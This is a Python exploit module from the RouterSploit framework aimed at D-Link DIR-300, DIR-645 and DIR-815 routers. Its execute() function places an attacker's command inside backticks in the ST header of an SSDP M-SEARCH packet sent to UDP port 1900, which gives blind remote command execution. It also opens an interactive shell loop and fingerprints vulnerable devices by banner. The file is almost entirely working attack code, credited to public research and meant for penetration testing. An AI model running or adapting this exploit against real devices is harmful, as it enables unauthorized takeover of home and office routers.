from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient


class Exploit(UDPClient):
    __info__ = {
        "name": "D-Link DIR-300 & DIR-645 & DIR-815 UPNP RCE",
        "description": "Module exploits D-Link DIR-300, DIR-645 and DIR-815 UPNP Remote Code Execution vulnerability which allows executing command on the device.",
        "authors": (
            "Zachary Cutlip",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection",
            "http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html",
            "https://www.exploit-db.com/exploits/34065/",
        ),
        "devices": (
            "D-Link DIR-300",
            "D-Link DIR-645",
            "D-Link DIR-815",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(1900, "Target UPNP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd = bytes(cmd, "utf-8")

        request = (
            b"M-SEARCH * HTTP/1.1\r\n" +
            b"Host:239.255.255.250:1900\r\n" +
            b"ST:uuid:`" + cmd + b"`\r\n" +
            b"Man:\"ssdp:discover\"\r\n" +
            b"MX:2\r\n\r\n"
        )

        udp_client = self.udp_create()
        udp_client.send(request)
        udp_client.close()

        return ""

    @mute
    def check(self):
        request = (
            b"M-SEARCH * HTTP/1.1\r\n"
            b"Host:239.255.255.250:1900\r\n"
            b"ST:upnp:rootdevice\r\n"
            b"Man:\"ssdp:discover\"\r\n"
            b"MX:2\r\n\r\n"
        )

        udp_client = self.udp_create()

        if udp_client:
            udp_client.send(request)
            response = udp_client.recv(65535)
            udp_client.close()

            if response and b"Linux, UPnP/1.0, DIR-" in response:
                return True  # target is vulnerable

        return False  # target is not vulnerable
